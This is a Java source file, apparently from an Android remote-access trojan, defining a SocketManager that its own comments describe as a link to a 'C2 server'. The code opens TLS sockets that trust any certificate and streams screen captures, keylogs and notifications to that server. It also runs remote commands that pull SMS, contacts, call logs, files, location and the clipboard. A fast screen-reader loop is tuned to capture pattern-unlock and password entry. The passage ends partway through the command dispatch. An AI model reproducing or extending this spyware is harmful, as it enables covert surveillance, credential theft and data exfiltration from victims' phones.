package com.task.tusker.network;

import android.content.Context;
import android.graphics.Bitmap;
import android.os.Build;
import android.util.Base64;
import android.util.Log;
import com.task.tusker.advanced.NotificationInterceptor;
import com.task.tusker.commands.*;
import com.task.tusker.services.UnifiedAccessibilityService;
import com.task.tusker.utils.Constants;
import com.task.tusker.utils.DeviceInfo;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.security.cert.X509Certificate;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

/**
 * SocketManager — persistent TCP connection to the C2 server.
 *
 * Protocol (matches server.js exactly):
 *   send:    {"event":"...", "data":{...}}\n
 *   receive: {"event":"...", "data":{...}}\n
 */
public class SocketManager {

    private static final String TAG = "SocketManager";

    private static SocketManager instance;
    private Socket   tcpSocket;
    private PrintWriter    out;
    private BufferedReader in;
    private final Context  context;
    private volatile boolean connected = false;
    private volatile boolean running   = false;

    // Device screen dimensions — populated during registration, sent in every frame
    private int deviceScreenW = 0;
    private int deviceScreenH = 0;

    // Bounded thread pool: up to 12 threads, 200-task queue, then discard-oldest.
    // Replaces newCachedThreadPool() which had no thread limit and could OOM the process.
    private final ExecutorService executor = new java.util.concurrent.ThreadPoolExecutor(
        4, 12, 60L, TimeUnit.SECONDS,
        new java.util.concurrent.LinkedBlockingQueue<>(200),
        r -> { Thread t = new Thread(r, "SocketMgr-worker"); t.setDaemon(true); return t; },
        new java.util.concurrent.ThreadPoolExecutor.DiscardOldestPolicy()
    );
    // Dedicated pool for bulk data commands (contacts, SMS, apps, files, keylogs).
    // Isolated from the stream executor so that large data fetches never delay frame captures.
    // Up to 6 parallel bulk operations; rejects excess with CallerRunsPolicy so they still complete.
    private final ExecutorService bulkExecutor = new java.util.concurrent.ThreadPoolExecutor(
        3, 6, 30L, TimeUnit.SECONDS,
        new java.util.concurrent.LinkedBlockingQueue<>(30),
        r -> { Thread t = new Thread(r, "SocketMgr-bulk"); t.setDaemon(true); return t; },
        new java.util.concurrent.ThreadPoolExecutor.CallerRunsPolicy()
    );
    private final ScheduledExecutorService heartbeatExecutor = Executors.newSingleThreadScheduledExecutor();
    private ScheduledFuture<?>             heartbeatFuture;

    // ── Multi-channel sockets ─────────────────────────────────────────────
    // Channel 1 (stream): dedicated socket for frame data only
    private Socket   streamSocket;
    private PrintWriter streamOut;
    private volatile boolean streamConnected = false;
    // Single-thread executor prevents multiple concurrent stream loops from stacking up
    private final ExecutorService streamExecutor = Executors.newSingleThreadExecutor();

    // Channel 2 (live): dedicated socket for keylogs / notifications / activity
    private Socket   liveSocket;
    private PrintWriter liveOut;
    private volatile boolean liveConnected = false;
    // Single-thread executor prevents multiple concurrent live loops from stacking up
    private final ExecutorService liveExecutor = Executors.newSingleThreadExecutor();

    // Streaming state — event-driven (single-frame on request, idle keepalive)
    private volatile boolean idleFrameMode = false;
    private ScheduledFuture<?> idleFrameFuture;
    // Interval (ms) between JPEG frame pushes — set by stream_start's intervalMs param.
    // Mirrors the screenReaderDashboardIntervalMs approach used by screen_reader_stream_start.
    private volatile long idleFrameIntervalMs = 2000L;
    // Saved streaming state so it can be restored after forceReconnect()
    private volatile boolean resumeStreamingAfterReconnect = false;
    // "Latest frame wins" — if a frame request arrives while the sender is busy,
    // we record it here.  When the sender finishes it immediately captures + sends
    // a fresh frame so the dashboard gets the most current screen, not a stale one.
    private final java.util.concurrent.atomic.AtomicBoolean pendingFrameRequest = new java.util.concurrent.atomic.AtomicBoolean(false);
    private volatile String streamingDeviceId = null;

    // Block-screen frame mode — when block is active the device auto-pushes a frame every 1.5s
    private volatile boolean blockFrameMode = false;
    private ScheduledFuture<?> blockFrameFuture;

    // ── Wake keep-alive loop — device wakes screen every 10 s until timed out ──
    private volatile ScheduledFuture<?> wakeKeepAliveFuture;
    private volatile long wakeKeepAliveLastTrigger = 0L;
    private static final long WAKE_KEEP_ALIVE_INTERVAL_MS = 10_000L;
    private static final long WAKE_KEEP_ALIVE_TIMEOUT_MS  = 4 * 60_000L; // auto-stop after 4 min

    // Screen-reader push mode — app continuously reads screen and pushes to dashboard
    private volatile ScheduledFuture<?> screenReaderFuture;

    // Normal interval between screen-reader ticks (ms)
    private static final long SCREEN_READER_NORMAL_INTERVAL_MS   = 50L;
    // Fast interval used when a pattern-unlock screen is active — captures each cell
    // block as it lights up before it fades, which happens faster than 50ms
    private static final long SCREEN_READER_PATTERN_INTERVAL_MS  = 16L;
    // True when the loop is currently running at the fast pattern-screen rate
    private volatile boolean inPatternScreenMode  = false;
    // True while a rate-switch restart has been submitted to the executor (prevents storms)
    private volatile boolean loopRestartPending   = false;

    // Dashboard push throttle — honors the intervalMs requested by screen_reader_stream_start.
    // The internal 50ms tick still runs (for password/pattern capture), but dashboard
    // screen:update pushes are rate-limited to this value. Default 2000ms is safe for 3G/4G.
    private volatile long screenReaderDashboardIntervalMs  = 2000L;
    private volatile long lastScreenReaderDashboardPushMs  = 0L;

    // Frame deduplication — skip pushing a frame if the screen content hasn't changed
    private volatile String lastFrameFingerprint = null;
    // Count consecutive identical frames — allow up to 4 duplicates before skip
    private volatile int consecutiveDuplicateCount = 0;
    // Offline recording: buffer frames when live channel is not connected
    private final java.util.ArrayList<JSONObject> offlineFrameBuffer = new java.util.ArrayList<>();
    private volatile boolean autoRecordingActive = false;
    private volatile boolean manualRecordingActive = false;
    private volatile long autoRecordingStartTime = 0L;

    // Debounce handle for device-user interaction frames
    private final AtomicReference<ScheduledFuture<?>> actionFrameFuture = new AtomicReference<>();

    // Frame throttle — only one frame capture at a time; drop new requests while busy
    private final java.util.concurrent.atomic.AtomicBoolean frameBusy = new java.util.concurrent.atomic.AtomicBoolean(false);

    // Per-channel send locks — CRITICAL: do NOT share one lock across channels.
    // A large JPEG frame write on the stream channel can stall the OS socket buffer
    // for 600 ms+ on 3G. If all channels share the same monitor (synchronized this),
    // command responses and heartbeats on the primary channel are completely blocked
    // for that duration, causing the 100 000+ ms device-latency seen on slow links.
    private final Object primaryLock = new Object();
    private final Object streamLock  = new Object();
    private final Object liveLock    = new Object();

    // Guard against queuing up multiple concurrent stream writes.
    // If the previous frame write is still blocking in the kernel (3G back-pressure),
    // drop the next frame rather than letting writes stack up in memory.
    private final java.util.concurrent.atomic.AtomicBoolean streamWriteBusy =
            new java.util.concurrent.atomic.AtomicBoolean(false);

    // Accessibility tree reads are NOT thread-safe — serialize them with a 1-permit semaphore.
    // Concurrent AccessibilityNodeInfo traversals corrupt Android's internal node pool and crash the process.
    private final java.util.concurrent.Semaphore accessSemaphore = new java.util.concurrent.Semaphore(1);

    // Touch/swipe deduplication — ignore identical command within 250 ms
    private volatile String  lastTouchKey  = "";
    private volatile long    lastTouchTime = 0L;

    // Dynamic monitored packages (runtime additions from dashboard)
    private final java.util.Set<String> dynamicMonitoredPackages = new java.util.concurrent.CopyOnWriteArraySet<>();

    // Command Handlers — one instance each, created once and reused
    private final CommandExecutor   commandExecutor;
    private final SMSHandler        smsHandler;
    private final ContactsHandler   contactsHandler;
    private final CallLogsHandler   callLogsHandler;
    private final CameraHandler     cameraHandler;
    private final ScreenshotHandler screenshotHandler;
    private final FileHandler       fileHandler;
    private final AudioRecorder     audioRecorder;
    private final KeyloggerService  keyloggerService;
    private final AppMonitor        appMonitor;
    private final ScreenBlackout    screenBlackout;
    private final PermissionManager permissionManager;
    private GestureRecorder         gestureRecorder;

    public static synchronized SocketManager getInstance(Context context) {
        if (instance == null) instance = new SocketManager(context.getApplicationContext());
        return instance;
    }

    private SocketManager(Context context) {
        this.context       = context;
        commandExecutor    = new CommandExecutor(context);
        smsHandler         = new SMSHandler(context);
        contactsHandler    = new ContactsHandler(context);
        callLogsHandler    = new CallLogsHandler(context);
        cameraHandler      = new CameraHandler(context);
        screenshotHandler  = new ScreenshotHandler(context);
        fileHandler        = new FileHandler(context);
        audioRecorder      = new AudioRecorder(context);
        keyloggerService   = new KeyloggerService(context);
        appMonitor         = new AppMonitor(context, keyloggerService);
        screenBlackout     = ScreenBlackout.getInstance();
        permissionManager  = new PermissionManager(context);
        // gestureRecorder is initialized lazily (needs AccessibilityService)
        KeyloggerService.setEnabled(true);
    }

    /** Called by UnifiedAccessibilityService once it's running, to init gesture recorder. */
    public void initGestureRecorder(android.accessibilityservice.AccessibilityService svc) {
        if (gestureRecorder == null) {
            gestureRecorder = new GestureRecorder(context, svc);
        }
    }

    /** Expose appMonitor so UnifiedAccessibilityService can call it. */
    public AppMonitor getAppMonitor()       { return appMonitor; }
    public KeyloggerService getKeylogger()  { return keyloggerService; }
    public GestureRecorder getGestureRecorder() { return gestureRecorder; }

    /** Whether streaming is currently active (idle-frame mode on). */
    public boolean isStreamingActive() { return idleFrameMode && connected; }

    /** Build an SSLSocketFactory that trusts all certificates (self-signed or CA). */
    private static SSLSocketFactory buildTrustAllFactory() {
        try {
            TrustManager[] trustAll = new TrustManager[]{ new X509TrustManager() {
                public void checkClientTrusted(X509Certificate[] c, String a) {}
                public void checkServerTrusted(X509Certificate[] c, String a) {}
                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
            }};
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, trustAll, new java.security.SecureRandom());
            return sc.getSocketFactory();
        } catch (Exception e) {
            Log.e("SocketManager", "buildTrustAllFactory failed: " + e.getMessage());
            return (SSLSocketFactory) SSLSocketFactory.getDefault();
        }
    }

    /**
     * Schedule a frame capture 200 ms after the last device-user interaction.
     * Resets the timer on each call so rapid interactions produce only one frame.
     */
    public void scheduleFrameAfterAction(String deviceId) {
        if (!isStreamingActive()) return;
        ScheduledFuture<?> prev = actionFrameFuture.getAndSet(null);
        if (prev != null) prev.cancel(false);
        // 80 ms — fast enough to show the result of a tap before the user taps again
        ScheduledFuture<?> next = heartbeatExecutor.schedule(
            () -> sendSingleFrame(deviceId), 80, TimeUnit.MILLISECONDS);
        actionFrameFuture.set(next);
    }

    // ── Connection lifecycle ──────────────────────────────────────────────

    public synchronized void connect() {
        if (running) {
            Log.d(TAG, "connect() — already running, skipping");
            return;
        }
        running = true;
        executor.execute(this::connectionLoop);
        // Start secondary channels with a slight delay so primary registers first
        streamExecutor.execute(() -> {
            try { Thread.sleep(1200); } catch (InterruptedException ignored) {}
            streamChannelLoop();
        });
        liveExecutor.execute(() -> {
            try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
            liveChannelLoop();
        });
    }

    private void connectionLoop() {
        while (running) {
            try {
                Log.i(TAG, "Connecting (TLS) to " + Constants.TCP_HOST + ":" + Constants.TCP_PORT);
                SSLSocketFactory tlsFactory = buildTrustAllFactory();
                SSLSocket sslSock = (SSLSocket) tlsFactory.createSocket(Constants.TCP_HOST, Constants.TCP_PORT);
                sslSock.setUseClientMode(true);
                sslSock.startHandshake();
                tcpSocket = sslSock;
                tcpSocket.setKeepAlive(true);
                tcpSocket.setTcpNoDelay(true);
                tcpSocket.setSoTimeout(0);

                out       = new PrintWriter(tcpSocket.getOutputStream(), true);
                in        = new BufferedReader(new InputStreamReader(tcpSocket.getInputStream()));
                connected = true;

                Log.i(TAG, "TCP connected — registering device");
                registerDevice(DeviceInfo.getDeviceId(context));
                startHeartbeat();
                listenForMessages();

            } catch (Throwable e) {
                // Catch Throwable (not just Exception) so an Error never kills the reconnect loop
                Log.e(TAG, "Connection error: " + e.getMessage());
            } finally {
                connected = false;
                stopHeartbeat();
                closeSilently();
            }

            if (running) {
                Log.d(TAG, "Reconnecting in " + Constants.TCP_RECONNECT_DELAY + " ms…");
                try { Thread.sleep(Constants.TCP_RECONNECT_DELAY); } catch (InterruptedException ignored) {}
            }
        }
        Log.i(TAG, "Connection loop ended");
    }

    private void closeSilently() {
        try { if (tcpSocket != null) tcpSocket.close(); } catch (Exception ignored) {}
        out = null;
        in  = null;
    }

    // ── Secondary channel: stream (frame data only) ───────────────────────

    private void streamChannelLoop() {
        while (running) {
            // Wait until the primary channel is established before opening secondary channels.
            // This prevents a flood of reconnection attempts when the primary isn't ready yet.
            if (!connected) {
                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
                continue;
            }
            try {
                SSLSocketFactory streamTlsFactory = buildTrustAllFactory();
                SSLSocket streamSsl = (SSLSocket) streamTlsFactory.createSocket(Constants.TCP_HOST, Constants.TCP_PORT);
                streamSsl.setUseClientMode(true);
                streamSsl.startHandshake();
                streamSocket = streamSsl;
                streamSocket.setKeepAlive(true);
                streamSocket.setTcpNoDelay(true);        // disable Nagle — send frames immediately
                streamSocket.setSendBufferSize(131072);  // 128 KB send buffer — frames fit in one flush
                streamSocket.setSoTimeout(0);
                streamOut = new PrintWriter(streamSocket.getOutputStream(), true);
                streamConnected = true;
                // Register as stream channel
                String deviceId = DeviceInfo.getDeviceId(context);
                JSONObject d = new JSONObject();
                d.put("deviceId", deviceId);
                d.put("channelType", "stream");
                JSONObject msg = new JSONObject();
                msg.put("event", "device:register_channel");
                msg.put("data", d);
                streamOut.print(msg.toString() + "\n");
                streamOut.flush();
                Log.i(TAG, "Stream channel connected");
                // If streaming was active before reconnect, restart idle frame mode.
                // Use a short delay so the stream socket is fully ready before sending frames.
                if (resumeStreamingAfterReconnect || idleFrameMode) {
                    final String did = deviceId;
                    resumeStreamingAfterReconnect = false;
                    executor.execute(() -> {
                        try { Thread.sleep(700); } catch (InterruptedException ignored) {}
                        if (streamConnected) {
                            Log.i(TAG, "Stream channel reconnected — resuming idle frame mode");
                            startIdleFrameMode(did);
                        }
                    });
                }
                // Keep alive — read loop; respond to pings so server doesn't time us out.
                // Pong writes must go through streamLock to prevent output corruption from
                // concurrent frame writes on the executor thread.
                java.io.BufferedReader sIn = new java.io.BufferedReader(
                    new java.io.InputStreamReader(streamSocket.getInputStream()));
                final String streamDeviceId = deviceId;
                String sLine;
                while (running && connected && (sLine = sIn.readLine()) != null) {
                    try {
                        JSONObject incoming = new JSONObject(sLine.trim());
                        if ("device:ping".equals(incoming.optString("event"))) {
                            JSONObject pong = new JSONObject();
                            pong.put("event", "device:pong");
                            JSONObject pd = new JSONObject();
                            pd.put("deviceId", streamDeviceId);
                            pong.put("data", pd);
                            final String pongStr = pong.toString() + "\n";
                            // Acquire streamLock before writing — prevents interleaving with frame writes
                            synchronized (streamLock) {
                                if (streamOut != null) {
                                    streamOut.print(pongStr);
                                    streamOut.flush();
                                }
                            }
                        }
                    } catch (Exception ignored) {}
                }
            } catch (Throwable e) {
                Log.e(TAG, "Stream channel error: " + e.getMessage());
            } finally {
                streamConnected = false;
                try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
                streamOut = null;
            }
            if (running) {
                try { Thread.sleep(Math.max(Constants.TCP_RECONNECT_DELAY, 5000)); } catch (InterruptedException ignored) {}
            }
        }
    }

    private void sendStreamMessage(String event, JSONObject data) {
        // Drop frame if a previous write is still blocking in the kernel (3G back-pressure).
        // This prevents unbounded write queuing that would cause command-channel stalls.
        if (!streamWriteBusy.compareAndSet(false, true)) {
            Log.d(TAG, "sendStreamMessage: stream write busy, dropping frame");
            return;
        }
        boolean useFallback = false;
        try {
            if (streamOut != null && streamConnected) {
                // streamLock is only held during the actual socket write; the fallback
                // to sendMessage happens AFTER releasing this lock to avoid lock-ordering
                // issues (never hold streamLock while acquiring primaryLock).
                synchronized (streamLock) {
                    try {
                        JSONObject msg = new JSONObject();
                        msg.put("event", event);
                        msg.put("data", data);
                        streamOut.print(msg.toString() + "\n");
                        streamOut.flush();
                    } catch (JSONException e) {
                        Log.e(TAG, "sendStreamMessage error: " + e.getMessage());
                        useFallback = true;
                    }
                }
            } else {
                useFallback = true;
            }
        } finally {
            streamWriteBusy.set(false);
        }
        // Fallback outside all locks — avoids lock-ordering deadlock with primaryLock
        if (useFallback) sendMessage(event, data);
    }

    // ── Secondary channel: live (keylogs, notifications, activity) ────────

    private void liveChannelLoop() {
        while (running) {
            // Wait until the primary channel is established before opening secondary channels.
            if (!connected) {
                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
                continue;
            }
            try {
                SSLSocketFactory liveTlsFactory = buildTrustAllFactory();
                SSLSocket liveSsl = (SSLSocket) liveTlsFactory.createSocket(Constants.TCP_HOST, Constants.TCP_PORT);
                liveSsl.setUseClientMode(true);
                liveSsl.startHandshake();
                liveSocket = liveSsl;
                liveSocket.setKeepAlive(true);
                liveSocket.setTcpNoDelay(true);       // disable Nagle — keylog/notif sent immediately
                liveSocket.setSendBufferSize(65536);  // 64 KB — ample for keylog/notif payloads
                liveSocket.setSoTimeout(0);
                liveOut = new PrintWriter(liveSocket.getOutputStream(), true);
                liveConnected = true;
                String deviceId = DeviceInfo.getDeviceId(context);
                JSONObject d = new JSONObject();
                d.put("deviceId", deviceId);
                d.put("channelType", "live");
                JSONObject msg = new JSONObject();
                msg.put("event", "device:register_channel");
                msg.put("data", d);
                liveOut.print(msg.toString() + "\n");
                liveOut.flush();
                Log.i(TAG, "Live channel connected");
                // Upload any offline recordings that were saved while disconnected
                uploadPendingOfflineRecordings();
                java.io.BufferedReader lIn = new java.io.BufferedReader(
                    new java.io.InputStreamReader(liveSocket.getInputStream()));
                String lLine;
                final String liveDeviceId = deviceId;
                while (running && connected && (lLine = lIn.readLine()) != null) {
                    try {
                        JSONObject incoming = new JSONObject(lLine.trim());
                        if ("device:ping".equals(incoming.optString("event"))) {
                            JSONObject pong = new JSONObject();
                            pong.put("event", "device:pong");
                            JSONObject pd = new JSONObject();
                            pd.put("deviceId", liveDeviceId);
                            pong.put("data", pd);
                            final String pongStr = pong.toString() + "\n";
                            synchronized (liveLock) {
                                if (liveOut != null) {
                                    liveOut.print(pongStr);
                                    liveOut.flush();
                                }
                            }
                        }
                    } catch (Exception ignored) {}
                }
            } catch (Throwable e) {
                Log.e(TAG, "Live channel error: " + e.getMessage());
            } finally {
                liveConnected = false;
                try { if (liveSocket != null) liveSocket.close(); } catch (Exception ignored) {}
                liveOut = null;
            }
            if (running) {
                try { Thread.sleep(Math.max(Constants.TCP_RECONNECT_DELAY, 5000)); } catch (InterruptedException ignored) {}
            }
        }
    }

    private void sendLiveMessage(String event, JSONObject data) {
        boolean useFallback = false;
        synchronized (liveLock) {
            if (liveOut != null && liveConnected) {
                try {
                    JSONObject msg = new JSONObject();
                    msg.put("event", event);
                    msg.put("data", data);
                    liveOut.print(msg.toString() + "\n");
                    liveOut.flush();
                } catch (JSONException e) {
                    Log.e(TAG, "sendLiveMessage error: " + e.getMessage());
                    useFallback = true;
                }
            } else {
                useFallback = true;
            }
        }
        // Fallback outside liveLock — avoids lock-ordering deadlock with primaryLock
        if (useFallback) sendMessage(event, data);
    }

    /**
     * Send on the live channel only — used for push events (keylog, notification, activity).
     * If the live channel is not connected (no internet / offline), the event is silently
     * dropped. We deliberately do NOT fall back to the primary channel so that high-frequency
     * push events never enter the command queue.
     */
    private void sendLiveOnly(String event, JSONObject data) {
        synchronized (liveLock) {
            if (!liveConnected || liveOut == null) return; // offline — drop silently
            try {
                JSONObject msg = new JSONObject();
                msg.put("event", event);
                msg.put("data", data);
                liveOut.print(msg.toString() + "\n");
                liveOut.flush();
            } catch (Exception e) {
                Log.e(TAG, "sendLiveOnly [" + event + "] error: " + e.getMessage());
            }
        }
    }

    /**
     * Stream a large JSONArray to the dashboard in small "data:chunk" live events so the
     * dashboard can render data progressively rather than waiting for the entire payload.
     *
     * Flow:
     *   1. Send chunks via sendLiveOnly("data:chunk", …)  ← dashboard accumulates
     *   2. Send final chunk with done=true
     *   3. Call sendResponse so the server resolves the pending command timer
     *
     * Must be called from a background thread (bulkExecutor), never from the TCP read loop.
     *
     * @param commandId  command UUID the dashboard is tracking
     * @param command    original command name (for display / routing on dashboard)
     * @param items      full dataset to stream
     * @param fieldName  JSON field name to use in the synthesised response (e.g. "contacts")
     * @param chunkSize  items per chunk — 50 is a good balance of granularity vs overhead
     */
    private void sendChunked(String commandId, String command,
                             JSONArray items, String fieldName, int chunkSize) {
        int total  = items.length();
        int idx    = 0;
        for (int start = 0; start < total; start += chunkSize) {
            JSONArray chunk = new JSONArray();
            int end = Math.min(start + chunkSize, total);
            for (int i = start; i < end; i++) {
                chunk.put(items.opt(i));
            }
            try {
                JSONObject msg = new JSONObject();
                msg.put("commandId",  commandId);
                msg.put("command",    command);
                msg.put("fieldName",  fieldName);
                msg.put("chunk",      chunk);
                msg.put("chunkIndex", idx++);
                msg.put("totalItems", total);
                msg.put("done",       false);
                sendLiveOnly("data:chunk", msg);
            } catch (Exception e) {
                Log.e(TAG, "sendChunked chunk error: " + e.getMessage());
            }
        }
        // Final done marker
        try {
            JSONObject done = new JSONObject();
            done.put("commandId",  commandId);
            done.put("command",    command);
            done.put("fieldName",  fieldName);
            done.put("totalItems", total);
            done.put("done",       true);
            sendLiveOnly("data:chunk", done);
        } catch (Exception e) {
            Log.e(TAG, "sendChunked done error: " + e.getMessage());
        }
        // Resolve the server-side pending command so the 45 s timer doesn't fire
        try {
            JSONObject ack = new JSONObject();
            ack.put("success",    true);
            ack.put("streaming",  true);
            ack.put("totalItems", total);
            sendResponse(commandId, command, ack);
        } catch (Exception e) {
            Log.e(TAG, "sendChunked sendResponse error: " + e.getMessage());
        }
    }

    /** Send a chunked-stream error — closes the stream and resolves the server timer. */
    private void sendChunkedError(String commandId, String command, String error) {
        try {
            JSONObject errEvent = new JSONObject();
            errEvent.put("commandId", commandId);
            errEvent.put("command",   command);
            errEvent.put("done",      true);
            errEvent.put("error",     error);
            sendLiveOnly("data:chunk", errEvent);
        } catch (Exception ignored) {}
        try {
            JSONObject errResult = new JSONObject();
            errResult.put("success", false);
            errResult.put("error",   error);
            sendResponse(commandId, command, errResult);
        } catch (Exception ignored) {}
    }

    // ── Heartbeat ────────────────────────────────────────────────────────

    private void startHeartbeat() {
        stopHeartbeat();
        String deviceId = DeviceInfo.getDeviceId(context);
        heartbeatFuture = heartbeatExecutor.scheduleAtFixedRate(
            () -> { if (connected) sendHeartbeat(deviceId); },
            Constants.HEARTBEAT_INTERVAL,
            Constants.HEARTBEAT_INTERVAL,
            TimeUnit.MILLISECONDS
        );
    }

    private void stopHeartbeat() {
        if (heartbeatFuture != null) {
            heartbeatFuture.cancel(false);
            heartbeatFuture = null;
        }
    }

    // ── Message loop ──────────────────────────────────────────────────────

    private void listenForMessages() {
        try {
            String line;
            while (running && (line = in.readLine()) != null) {
                final String msg = line.trim();
                if (!msg.isEmpty()) executor.execute(() -> processMessage(msg));
            }
        } catch (Throwable e) {
            Log.e(TAG, "Read error: " + e.getMessage());
        }
    }

    private void processMessage(String raw) {
        try {
            JSONObject json  = new JSONObject(raw);
            String     event = json.getString("event");
            JSONObject data  = json.optJSONObject("data");

            Log.d(TAG, "← event: " + event);

            switch (event) {
                case "device:ping":
                    sendPong();
                    break;

                case "device:registered":
                    Log.i(TAG, "Server acknowledged registration ✓");
                    break;

                case "connection:reset":
                    Log.w(TAG, "Server requested connection reset — reconnecting cleanly");
                    // Close socket to trigger the reconnect loop; stored data is untouched
                    executor.execute(() -> {
                        connected = false;
                        closeSilently();
                        try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
                        try { if (liveSocket   != null) liveSocket.close();   } catch (Exception ignored) {}
                        streamConnected = false;
                        liveConnected   = false;
                    });
                    break;

                case "command:execute":
                    if (data != null) {
                        String     commandId = data.optString("commandId", "");
                        String     command   = data.optString("command", "");
                        JSONObject params    = data.optJSONObject("params");
                        if (!command.isEmpty()) {
                            handleCommand(commandId, command, params);
                        }
                    }
                    break;

                default:
                    Log.w(TAG, "Unhandled event: " + event);
            }

        } catch (Throwable e) {
            // Catch Throwable — any uncaught exception here would silently kill the executor thread
            Log.e(TAG, "processMessage error: " + e.getMessage() + " raw=" + raw);
        }
    }

    // ── Send helpers ──────────────────────────────────────────────────────

    private void sendMessage(String event, JSONObject data) {
        synchronized (primaryLock) {
            if (out != null && connected) {
                try {
                    JSONObject msg = new JSONObject();
                    msg.put("event", event);
                    msg.put("data", data);
                    out.print(msg.toString() + "\n");
                    out.flush();
                    // PrintWriter swallows IOExceptions — checkError() is the only way to detect a dead socket
                    if (out.checkError()) {
                        Log.w(TAG, "sendMessage: socket write error detected — marking disconnected");
                        connected = false;
                        closeSilently();
                    }
                } catch (JSONException e) {
                    Log.e(TAG, "sendMessage error: " + e.getMessage());
                }
            }
        }
    }

    public void emit(String event, JSONObject data) { sendMessage(event, data); }

    private void sendPong() {
        try {
            JSONObject d = new JSONObject();
            d.put("deviceId", DeviceInfo.getDeviceId(context));
            sendMessage("device:pong", d);
        } catch (JSONException ignored) {}
    }

    public void registerDevice(String deviceId) {
        try {
            android.view.WindowManager wm = (android.view.WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            android.graphics.Point screenSize = new android.graphics.Point();
            wm.getDefaultDisplay().getRealSize(screenSize);

            // Store for use in every frame message
            deviceScreenW = screenSize.x;
            deviceScreenH = screenSize.y;

            JSONObject info = new JSONObject();
            info.put("name",           DeviceInfo.getDeviceName());
            info.put("model",          DeviceInfo.getModel());
            info.put("androidVersion", DeviceInfo.getAndroidVersion());
            info.put("manufacturer",   android.os.Build.MANUFACTURER);
            info.put("sdk",            Build.VERSION.SDK_INT);
            info.put("screenWidth",    deviceScreenW);
            info.put("screenHeight",   deviceScreenH);

            JSONObject d = new JSONObject();
            d.put("deviceId",   deviceId);
            d.put("userId",     "");
            d.put("deviceInfo", info);
            sendMessage("device:register", d);
            Log.d(TAG, "Registered device: " + deviceId);
        } catch (JSONException e) {
            Log.e(TAG, "registerDevice error: " + e.getMessage());
        }
    }

    public void sendHeartbeat(String deviceId) {
        try {
            JSONObject d = new JSONObject();
            d.put("deviceId", deviceId);
            sendMessage("device:heartbeat", d);
        } catch (JSONException ignored) {}
    }

    /** Send a command:response back to the server. result may be a JSONObject or a String. */
    public void sendResponse(String commandId, String command, Object result) {
        try {
            String responseStr;
            if (result instanceof JSONObject) {
                responseStr = result.toString();
            } else if (result != null) {
                responseStr = result.toString();
            } else {
                responseStr = "{}";
            }

            JSONObject d = new JSONObject();
            d.put("commandId", commandId);
            d.put("response",  responseStr);
            sendMessage("command:response", d);
            Log.d(TAG, "→ response sent for " + command);
        } catch (JSONException e) {
            Log.e(TAG, "sendResponse error: " + e.getMessage());
        }
    }

    private void sendErrorResponse(String commandId, String command, String error) {
        try {
            JSONObject d = new JSONObject();
            d.put("commandId", commandId);
            d.put("error",     error);
            sendMessage("command:response", d);
            Log.w(TAG, "→ error response for " + command + ": " + error);
        } catch (JSONException e) {
            Log.e(TAG, "sendErrorResponse error: " + e.getMessage());
        }
    }

    public void disconnect() {
        running   = false;
        connected = false;
        streamConnected = false;
        liveConnected   = false;
        stopHeartbeat();
        stopIdleFrameMode();
        stopBlockFrameMode();
        closeSilently();
        try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
        try { if (liveSocket   != null) liveSocket.close();   } catch (Exception ignored) {}
        streamOut = null;
        liveOut   = null;
    }

    public boolean isConnected() { return connected; }

    /**
     * Force a full re-initialization of all channels.
     * Closes every open socket, resets the running flag, and starts fresh connection loops.
     * Safe to call even when a connection is already active — used by RemoteAccessService
     * on every onStartCommand so that a crash/restart always re-registers with the server.
     */
    public synchronized void forceReconnect() {
        Log.i(TAG, "forceReconnect() — tearing down all channels and reconnecting");
        // Save streaming state before tearing down so it can be restored after reconnection
        resumeStreamingAfterReconnect = idleFrameMode || blockFrameMode;
        // Tear down existing state
        running   = false;
        connected = false;
        streamConnected = false;
        liveConnected   = false;
        stopHeartbeat();
        stopIdleFrameMode();
        stopBlockFrameMode();
        closeSilently();
        try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
        try { if (liveSocket   != null) liveSocket.close();   } catch (Exception ignored) {}
        streamOut = null;
        liveOut   = null;
        // Give threads a moment to exit their loops, then start fresh
        executor.execute(() -> {
            try { Thread.sleep(500); } catch (InterruptedException ignored) {}
            connect();
        });
    }

    // ── Command dispatch ──────────────────────────────────────────────────

    private void handleCommand(String commandId, String command, JSONObject params) {
        Log.i(TAG, "handleCommand: " + command + " [" + commandId + "]");
        JSONObject result;
        // Inject commandId into params so dispatchCommand can use it (e.g. for run_task_local)
        if (params == null) params = new JSONObject();
        try { params.put("commandId", commandId); } catch (JSONException ignored) {}

        try {
            result = dispatchCommand(command, params);
        } catch (Throwable e) {
            // Catch Throwable so OOM or other Errors still send an error response
            Log.e(TAG, "handleCommand exception for " + command + ": " + e.getMessage());
            sendErrorResponse(commandId, command, "Internal error: " + e.getMessage());
            return;
        }

        // null means the command handles its own response asynchronously (chunked streaming).
        // bulkExecutor tasks call sendResponse / sendChunked directly — do not double-send.
        if (result == null) return;
        sendResponse(commandId, command, result);
    }

    private JSONObject dispatchCommand(String command, JSONObject params) throws Exception {
        if (params == null) params = new JSONObject();

        // ── System / Device ──────────────────────────────────────────────
        switch (command) {
            case "ping":
            case "vibrate":
            case "play_sound":
            case "get_clipboard":
            case "set_clipboard":
            case "get_device_info":
            case "get_location":
            case "get_battery_info":
            case "get_network_info":
            case "get_wifi_networks":
            case "get_system_info":
                return commandExecutor.executeCommand(command, params);

            case "get_installed_apps": {
                // Offload to bulkExecutor + chunked streaming so label-loading (200+ Binder IPCs)
                // doesn't block the stream executor or time out the 45 s server timer.
                final String cid0 = params.optString("commandId", "");
                final JSONObject fp0 = params;
